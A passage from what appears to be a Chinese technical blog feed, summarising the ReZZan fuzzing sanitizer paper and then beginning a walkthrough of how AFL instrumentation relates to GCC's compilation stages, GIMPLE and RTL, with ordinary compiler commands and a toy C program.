onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>插桩模式：</strong></p><ul><li>基本方法：转换程序（e.g.使用一个LLVM编译器基础设施<strong>pass</strong>）来在每个内存访问之前插入插桩代码</li><li>插桩内容：检查是否违反给定的安全属性（在设计的sanitizer中，该安全属性是相应访问的内容是否被poisoned）</li></ul><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>:</p><p><img src="/2023/01/10/ReZZan/3.png"></p><ul><li><img src="/2023/01/10/ReZZan/4.png"></li></ul><blockquote><p>第4行内存间接引用不会产生任何其他页错误，而第5-6行的错误检查访问内存以检索存储在全局变量中的NONCE值，而NONCE存储在单个位置，因此这里<strong>最多会额外产生一个页错误</strong></p></blockquote><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>运行时支持：</strong></p><ul><li><p>加强内存安全，修改了运行时环境以毒化redzone和free内存</p></li><li><p>每一个对象类处理方式不同：</p><p><strong>堆分配对象</strong>：e.g. <code>malloc</code>, <code>realloc</code>, <code>new</code>等都被替换成为每一个分配目标后添加了redzone的版本，redzones的实现与其他内存错误sanitizer相似，但也有不同：</p><ol><li>Poisoning是通过将NONCE-初始化令牌直接写入redzone内存来实现的</li><li>redzone的大小是1个或者2个tokens（取决于对齐）</li><li>redzone放置在目标的最后，通过前一个对象的redzone来检测Underflows</li></ol><p>实现了一个简单的自定义内存分配器：连续分配目标</p><p>堆内存释放：释放的目标相应内存填充为一个NONCE-初始化的token；维护了一个隔离区（本质上是一个队列），隔离区存放了释放的内存目标，目的是延迟重新分配，从而更可能检测到<code>reuse-after-free</code>。从隔离区删除对象以便重新分配，相应的内存在使用前清零以“unpoison”该内存。</p><hr><p><strong>栈分配对象</strong>：使用LLVM pass实现转换</p><ol><li>修改分配大小：包含原始分配的大小和一个redzone内存</li><li>redzone内存将写入一个NONCE-初始化token，剩余内存全部置0</li></ol><hr><p><strong>全局变量</strong>： 使用LLVM pass实现转换</p><p>具体操作和栈分配对象相似，不再赘述</p></li></ul><h2 id="4-改进的边界检查"><a href="#4-改进的边界检查" class="headerlink" title="4. 改进的边界检查"></a>4. 改进的边界检查</h2><ul><li><p>基本思想：除了随机化的NONCE之外，还将对象边界信息<strong>编码</strong>存进嵌入令牌中，该边界信息可以在运行时检索</p></li><li><p>包含两个组件：</p><ul><li><em>random</em>：NONCE值</li><li>boundary：目标边界的编码形式：</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">size mod <span class="hljs-title function_">sizeof</span><span class="hljs-params">(Token)</span>  <span class="hljs-comment">// size是目标的大小</span><br></code></pre></td></tr></tbody></table></figure></li><li><p>改进的令牌是由具有两个位字段的结构表示：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Token</span> {</span><br><span class="hljs-type">uint64_t</span> random :<span class="hljs-number">61</span>; <span class="hljs-comment">// NONCE</span><br><span class="hljs-type">uint64_t</span> boundary :<span class="hljs-number">3</span>; <span class="hljs-comment">// Boundary encoding</span><br>};<br></code></pre></td></tr></tbody></table></figure><p><em>boundary</em>字段至少需要<strong>3位</strong>来表示所有可能的边界值，那么<em>random</em>字段就只能缩减为<strong>61位</strong>（64-3）</p></li></ul><hr><ul><li>使用额外的边界检查对内存访问进行插桩，基本思想如下图所示：</li></ul><p><img src="/2023/01/10/ReZZan/5.png"></p><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 假设目标大小不是一个令牌大小（8字节）的整数倍，e.g. (<em>size</em> mod sizeof(Token)) = 5，也就是要使用一个额外的sizeof(Token)-5=3字节的<strong>填充</strong>，在该填充中的溢出无法被基本的RET检测到，为了检测到这种溢出，我们对内存访问进行插桩以实施一个额外的边界检测：</p><ol><li><p>检查内存中当前word的下一个word[8字节]</p></li><li><p>如果下一个word不是一个token(i.e.随机比特与NONCE不相同)，那么内存访问是允许的</p></li><li><p>否则，检索边界字段并将其余内存访问范围 $lb…ub$ 进行比较，当下面条件不成立时，即发生了越界操作：</p><p><img src="/2023/01/10/ReZZan/6.png"></p></li></ol><p>由于检查的是下一个word，因此基本上绕过了填充空间不足的问题，在图3的示例中，任何与填充重叠的内存访问都不会满足，因此可以检测到溢出</p><hr><p><strong>插桩模式：</strong></p><p><img src="/2023/01/10/ReZZan/3.png"></p><ul><li>图2的第9-13行为边界检查的插桩，这里假设该内存访问已经通过RET检查，保证了ub不包含token</li></ul><blockquote><p>下一个word可能位于不同的页面，因此可能无法访问。这可以通过禁用对页边界的精确检查来进行处理，随之带来的就是精确度的降低；或者所有映射都可以通过一个NONCE-初始化页进行扩展，可以通过使用信号处理器来检测边界检查引起的故障，然后“按需”扩展相应的映射来实现</p></blockquote><h2 id="5-实验设置"><a href="#5-实验设置" class="headerlink" title="5. 实验设置"></a>5. 实验设置</h2><ul><li><p>x86_64上实现了REt+fuZZing+sANitzer（ReZZan）：</p><ul><li>ReZZan：细粒度内存错误检测，包括RET（第三节）和字节准确的边界检测（第四节）</li><li>ReZZan<sub>lite</sub>：减弱粒度的内存错误检测，仅包括RET。此版本速度更快，但无法检测到对象填充中的某些溢出</li></ul></li><li><p>ReZZan的实现包括两个部分：</p><ul><li>LLVM Pass：<ul><li>转换所有内存操作（e.g. <code>load/store</code>）以插入RET和边界检查插桩。对于ReZZan<sub>lite</sub>来说，边界检查将被忽略</li><li>将所有栈分配操作（e.g. <code>alloca</code>）和全局变量转换为使用redzone保护的新版本</li></ul></li><li>运行时库：<ul><li>实现了替换堆分配函数（例如<code>malloc</code>、<code>free</code>等），替换的函数可以插入redzone以及poison释放的内存</li></ul></li></ul></li></ul><hr><h3 id="研究问题"><a href="#研究问题" class="headerlink" title="研究问题"></a>研究问题</h3><ul><li><p>主要假说：基于RET的消毒剂设计可以</p><ol><li>在模糊测试环境下表现出较低的性能开销</li><li>实现与更传统的Sanitizer设计（如ASAN）类似的内存错误检测能力</li></ol></li><li><p>六个研究问题：</p></li></ul><table><thead><tr><th>序号</th><th>描述</th></tr></thead><tbody><tr><td>RQ1 - 检测能力</td><td>ReZZan是否检测到与ASan相同类型的内存错误？</td></tr><tr><td>RQ2 - 执行速度</td><td>在模糊测试环境下，ReZZan比ASan快多少？</td></tr><tr><td>RQ3 - 分支覆盖</td><td>ReZZan的分支覆盖范围与ASan相比如何？</td></tr><tr><td>RQ4 - 漏洞发现有效性</td><td>与ASan相比，ReZZan可以更快地暴露bug吗？</td></tr><tr><td>RQ5 - 灵活性</td><td>ReZZan可以用来模糊大型程序吗？ReZZan与其他模糊器兼容吗？</td></tr><tr><td>RQ6 - 误报</td><td>ReZZan在实际执行环境中的错误检测率是多少？</td></tr></tbody></table><h3 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h3><p><strong>实验环境：</strong></p><ul><li>Intel Xeon CPU E5-2660v3：28个物理内核、56个逻辑内核，2.4GHz</li><li>64GB RAM</li><li>Ubuntu 16.04（64位）LTS（最大利用率为26个内核）</li></ul><hr><p><strong>基线：</strong></p><ul><li>ASan（LLVM-12）、FuZZan（具有动态元数据结构切换模式）</li><li>ASan和FuZZan都：<ol><li>仍在维护</li><li>支持x86_64</li><li>可以与现有的模糊器集成</li></ol></li></ul><hr><p><strong>模糊测试引擎</strong>：</p><ul><li>AFL（v2.57b）<ul><li>是大多数现代模糊器的基础</li><li>评估所使用的所有sanitizer都支持</li></ul></li></ul><hr><p><strong>基准套件</strong>：</p><ul><li>RQ1：Juliet基准套件</li><li>RQ2/RQ3：cxxfilt、nm、objdump、size（均来自binutils-2.31）、file（来自coreutils版本5.35）、jerryscript（版本2.4.0）、mupdf（版本1.19.0）、，libpng（版本1.6.38）、openssl（版本1.0.1f）、sqlite3（版本3.36.0）和tcpdump（版本4.10.0）</li><li>RQ4：谷歌的fuzzer-test-suite2</li></ul><p>选择相同的初始种子语料库，如果没有提供输入则使用空文件</p><hr><p><strong>实验设置：</strong></p><ul><li>每个实验进行24小时，重复20次</li></ul><h2 id="6-评估结果"><a href="#6-评估结果" class="headerlink" title="6. 评估结果"></a>6. 评估结果</h2><h3 id="RQ-one-检测能力"><a href="#RQ-one-检测能力" class="headerlink" title="RQ:one: 检测能力"></a>RQ<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 检测能力</h3><p><img src="/2023/01/10/ReZZan/7.png"></p><ul><li>ReZZan和ReZZan<sub>lite</sub>对于underflow detection的检测性能略低于ASan，这是因为ASan默认为堆栈对象使用double-wide（32字节）红区。当ReZZan配置类似时，也能100%检测下溢错误</li></ul><p><img src="/2023/01/10/ReZZan/8.png"></p><blockquote><p>对于Juliet测试套件中的内存错误错误（CWE 121、122、124、126、127、416），ReZZan和ReZZan<sub>lite</sub>分别通过99.04%和87.89%的坏测试用例</p></blockquote><h3 id="RQ-two-执行速度"><a href="#RQ-two-执行速度" class="headerlink" title="RQ:two: 执行速度"></a>RQ<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 执行速度</h3><p><img src="/2023/01/10/ReZZan/9.png"></p><p><img src="/2023/01/10/ReZZan/10.png"></p><ul><li>页错误</li></ul><p><img src="/2023/01/10/ReZZan/11.png"></p><blockquote><p>当与模糊测试相结合时，ReZZan（1.27×）和ReZZan<sub>lite</sub>（1.14×）的开销低于传统的Sanitizer ASan（2.36×）和FuZZan（2.00×）。ReZZan和ReZZan<sub>lite</sub>的性能与没有任何内存错误sanitization的模糊测试相当，页面错误的数量也是如此.</p></blockquote><h3 id="RQ-three-分支覆盖"><a href="#RQ-three-分支覆盖" class="headerlink" title="RQ:three: 分支覆盖"></a>RQ<span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 分支覆盖</h3><p><img src="/2023/01/10/ReZZan/12.png"></p><blockquote><p>平均而言，ReZZan和ReZZan<sub>lite</sub>实现了与Native类似的分支覆盖。ReZZan的模糊化活动在24小时内探索了比ASan多5.54%的代码分支。</p></blockquote><h3 id="RQ-four-漏洞寻找有效性"><a href="#RQ-four-漏洞寻找有效性" class="headerlink" title="RQ:four: 漏洞寻找有效性"></a>RQ<span class="github-emoji"><span>4⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0034-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 漏洞寻找有效性</h3><p><img src="/2023/01/10/ReZZan/13.png"></p><blockquote><p>ReZZan比ASan快3.68倍。在实践中，ReZZan还可以检测到比ReZZan<sub>lite</sub>更多的错误。</p></blockquote><h3 id="RQ-five-灵活性"><a href="#RQ-five-灵活性" class="headerlink" title="RQ:five: 灵活性"></a>RQ<span class="github-emoji"><span>5⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0035-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 灵活性</h3><ul><li><p><strong>模糊器的支持：</strong></p><ul><li>与AFL++集成：</li></ul><p><img src="/2023/01/10/ReZZan/14.png"></p></li><li><p><strong>持久模式模糊测试：</strong></p><ul><li>FuzzBench提供的harness作为测试对象</li><li>ReZZan和ReZZan<sub>lite</sub>的性能略有下降</li><li>结果表明：1. ReZZan可以应用于fork模式和持久模式；2. ReZZen在较长运行时间内的其性能最终将接近ASan</li></ul></li><li><p><strong>可扩展性：</strong></p><p><img src="/2023/01/10/ReZZan/15.png"></p><ul><li><p>考虑到Firefox的规模，与其他基准相比，总体模糊吞吐量要慢得多。尽管如此，ReZZan和ReZZan<sub>lite</sub>仍以112.60%和114.86%的改善率优于ASan</p></li><li><p>证明ReZZan是可扩展的</p></li></ul></li></ul><h3 id="RQ-six-误报"><a href="#RQ-six-误报" class="headerlink" title="RQ:six: 误报"></a>RQ<span class="github-emoji"><span>6⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0036-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 误报</h3><ul><li>ReZZan设计允许少量误报</li><li>实验包括超过19200小时（≈2.2年）CPU时间，在此期间没有观察到误报</li><li>预期是数十年的CPU时间才可能观察到第一次误报</li></ul><h2 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h2><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 亮点：</p><ul><li>论文分析了现有Sanitizer与基于fork模式的模糊器结合时对模糊测试性能的影响，主要体现在：1. COW机制导致频繁的页错误；2.disjoint metadata，因此与fork()兼容性不好</li><li>论文提出了基于RET和改进的细粒度边界检测的Sanitizer——ReZZan，并通过详细的实验论证ReZZan的性能</li><li>实验部分很详细</li><li>项目开源：<a href="https://github.com/bajinsheng/ReZZan">https://github.com/bajinsheng/ReZZan</a></li></ul><p>不足：</p><ul><li>仅支持llvm-12，而且wrapper的一些细节处理不是很好</li><li><strong>目测</strong>应该不会有ASan那么详细的错误报告，也就是说ReZZan仅会异常结束程序，还需要使用ASan查看具体是何种漏洞类型（待验证）</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>论文阅读</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出AFL插桩</title>
    <link href="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/"/>
    <url>/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL插桩剖析"><a href="#AFL插桩剖析" class="headerlink" title="AFL插桩剖析"></a>AFL插桩剖析</h1><h2 id="I-前置知识"><a href="#I-前置知识" class="headerlink" title="I. 前置知识"></a>I. 前置知识</h2><ul><li>编译器产生可执行文件的流程如下图1、2所示（以gcc编译器为例，clang同理）：</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/1.png"></p><center>图1 gcc编译器工作流程（顶层架构）</center><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/2.png"></p><center>图2 clang编译器工作流程（顶层架构）</center><ul><li>主流的编译器【图1中第二个阶段】包括三个组件：<strong>前端</strong>、<strong>中间端</strong>和<strong>后端</strong> [1]<ul><li>前端：读取源文件并对其进行分析，通常是将源码转化为标准抽象语法树（AST）</li><li>中间端：进行源码优化，通常是使用生成的某种中间表示【GCC中是GIMPLE/RTL；Clang中是IR】，并根据该中间表示进行优化</li><li>后端：使用优化后的中间表示来生成对应目标架构的汇编代码</li></ul></li></ul><h3 id="1-GCC"><a href="#1-GCC" class="headerlink" title="1. GCC"></a>1. GCC</h3><ul><li>GCC 4.1架构图：</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/4.png"></p><center>图3 GCC 4.1架构图</center><h4 id="四个阶段"><a href="#四个阶段" class="headerlink" title="四个阶段"></a>四个阶段</h4><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/5.png"></p><center>图4 编译器在编译链接时的具体流程[8]</center><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -E afl_inst_test.c <span class="hljs-comment"># 预处理</span><br>$ gcc -S afl_inst_test.c <span class="hljs-comment"># 编译</span><br>$ gcc -c afl_inst_test.c <span class="hljs-comment"># 汇编 =&gt; 目标文件 or as afl_inst_test.s -o afl_inst_test.o</span><br>$ ld -plugin /usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper -plugin-opt=-fresolution=/tmp/cclTw8TB.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/7/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/7 -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/7/../../.. ./afl_inst_test.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/7/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crtn.o -o afl_inst_test <span class="hljs-comment"># 链接！[10]</span><br>$ afl_inst_test<br>This is a <span class="hljs-built_in">test</span>!<br>Please give me an input number:-1<br>-1 is a negative number~<br></code></pre></td></tr></tbody></table></figure><h4 id="前端分析"><a href="#前端分析" class="headerlink" title="前端分析"></a>前端分析</h4><ul><li><p>对源代码进行<strong>预处理</strong>、<strong>语法分析</strong>、<strong>语义分析</strong>，同时会生成抽象语法树<strong>AST</strong></p></li><li><p>parse the source code  <span class="github-emoji"><span>➡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>  即将源代码转化为有意义的数据（有意义是针对机器来说的），表示我们可读的源代码究竟想要表达啥</p></li></ul><hr><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>GCC本身无法输出生成的AST [2]，这里我们展示GCC编译过程中生成的CFG [3]</strong> ：</p><ol start="0"><li>源代码：</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// afl_inst_test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>{<br><span class="hljs-keyword">if</span>(a &gt; <span class="hljs-number">0</span>){<br><span class="hljs-keyword">return</span> -a;<br>}<br><span class="hljs-keyword">return</span> a;<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span>{<br><span class="hljs-type">int</span> a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"This is a test!\nPlease give me an input number:"</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;a);<br><span class="hljs-comment">/* simulating branches */</span><br><span class="hljs-keyword">if</span>(a &gt; <span class="hljs-number">0</span>){<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d is a positive number~"</span>, a);<br>}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a &lt; <span class="hljs-number">0</span>){<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d is a negative number~"</span>, a);<br>}<span class="hljs-keyword">else</span> {<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"zero detected!"</span>);<br>}<br><span class="hljs-comment">/* simulating a function call */</span><br>fun(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ol><li>产生AST对应的<code>.dot</code>文件：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-tree-all-graph<br>$ <span class="hljs-built_in">ls</span><br>afl_inst_test.c<br>afl_inst_test.c.001t.tu<br>afl_inst_test.c.002t.class<br>afl_inst_test.c.003t.original<br>...<br>afl_inst_test.c.227t.optimized<br>afl_inst_test.c.227t.optimized.dot<br>afl_inst_test.c.311t.statistics<br>a.out<br></code></pre></td></tr></tbody></table></figure><ol start="2"><li>使用<code>dot</code>程序将main函数对应<code>.dot</code>转化为可视图：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dot -Tpng afl_inst_test.c.011t.cfg.dot -o main.png<br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/3.png"></p><center>图5 示例CFG</center><h4 id="中间端优化"><a href="#中间端优化" class="headerlink" title="中间端优化"></a>中间端优化</h4><ul><li>GCC中间端包括两个部分：<strong>GIMPLE</strong> 和 <strong>RTL</strong></li></ul><hr><p><strong>GIMPLE：</strong></p><ul><li><p>派生自GCC <strong>GENERIC</strong>（也是一种中间表示；最初，不同的GCC前端会生成依赖于架构的树表示，而GENERIC是作为与平台无关的树表示而引入的，以简化前端开发过程。<strong>GENERIC</strong>的目标是生成<strong>GIMPLE</strong> [5]）</p></li><li><p>three-address表示：</p><ul><li>将<strong>GENERIC</strong>表达式拆成不超过3个操作数的元组（除了函数调用）</li></ul></li><li><p>引入<strong>暂存器</strong>来保存计算复杂表达式所需的中间值，GENERIC中使用的控制结构降级为<strong>条件跳转</strong>，词法<strong>作用域被移除</strong>，而异常区域则被转换为边上的异常区域树</p></li><li><p>使用一个”gimplifier”将<strong>GENERIC</strong>转化为<strong>GIMPLE</strong></p></li><li><p>包括”<strong>High GIMPLE</strong>“和”<strong>Low GIMPLE</strong>“</p><ul><li>High GIMPLE包含一些容器语句，如词法范围和嵌套表达式，派生自<strong>前端AST树</strong>或<strong>GENERIC</strong>，然后基于High GIMPLE生成Low GIMPLE</li><li>Low GIMPLE则显示所有控制和异常表达式的隐含跳转</li></ul></li><li><p>C和C++前端直接从前端AST树转化为<strong>GIMPLE</strong>，而不是转化为<strong>GENERIC</strong></p></li><li><p>使用标志<code>-fdump-tree-gimple</code>来生成类C的表示</p></li></ul><p><span class="github-emoji"><span>✋</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/270b.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 说白了，<strong>GIMPLE</strong>就是干了两件事：</p><p>​<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 删除高级结构，如for，while循环【用goto和跳转替换】</p><p>​<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 简化表达式（通过引入临时变量）</p><p><span class="github-emoji"><span>⚠</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 可以在Low GIMPLE实现GIMPLE层级的Pass！</p><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code> if (a || b) stmt;</code>  ==&gt;</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (a) <span class="hljs-keyword">goto</span> L1;<br><span class="hljs-keyword">if</span> (b) <span class="hljs-keyword">goto</span> L1; <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> L2;<br>L1:<br>stmt;<br>L2:<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>GCC生成GIMPLE</strong>：</p><p>Low GIMPLE:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-tree-gimple<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.c.004t.gimple <br>fun (int a)<br>{<br>  int D.2258;<br><br>  <span class="hljs-keyword">if</span> (a &gt; 0) goto &lt;D.2256&gt;; <span class="hljs-keyword">else</span> goto &lt;D.2257&gt;;<br>  &lt;D.2256&gt;:<br>  D.2258 = -a;<br>  <span class="hljs-built_in">return</span> D.2258;<br>  &lt;D.2257&gt;:<br>  D.2258 = a;<br>  <span class="hljs-built_in">return</span> D.2258;<br>}<br>...<br></code></pre></td></tr></tbody></table></figure><p>High GIMPLE:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-tree-gimple-raw<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.c.004t.gimple<br>fun (int a)<br>gimple_bind &lt;<br>  int D.2258;<br><br>  gimple_cond &lt;gt_expr, a, 0, &lt;D.2256&gt;, &lt;D.2257&gt;&gt;<br>  gimple_label &lt;&lt;<span class="hljs-string">D.2256&gt;&gt;</span><br><span class="hljs-string">  gimple_assign &lt;negate_expr, D</span>.2258, a, NULL, NULL&gt;<br>  gimple_return &lt;D.2258 NULL&gt;<br>  gimple_label &lt;&lt;<span class="hljs-string">D.2257&gt;&gt;</span><br><span class="hljs-string">  gimple_assign &lt;parm_decl, D</span>.2258, a, NULL, NULL&gt;<br>  gimple_return &lt;D.2258 NULL&gt;<br>&gt;<br>...<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>RTL:</strong></p><ul><li>寄存器转换语言 <em>Register Transfer Language</em>，与汇编语言很接近</li><li>表示一个具有无限数量寄存器的抽象机器，结构类似于Lisp和C语言的混合</li><li>在生成<strong>RTL</strong>代码后，GCC编译器在将其转换到汇编语言之前进行了不同的<strong>底层优化</strong> [7]</li><li>由于<strong>RTL</strong>表示的生成和优化的程序在编译过程的后端，这意味着它依赖于硬件，而不包含程序的所有信息</li></ul><p><span class="github-emoji"><span>✋</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/270b.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 说白了，<strong>RTL</strong>就是干了两件事：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 将<strong>GIMPLE</strong>转化为与硬件相关的RTL语言</p><p><span 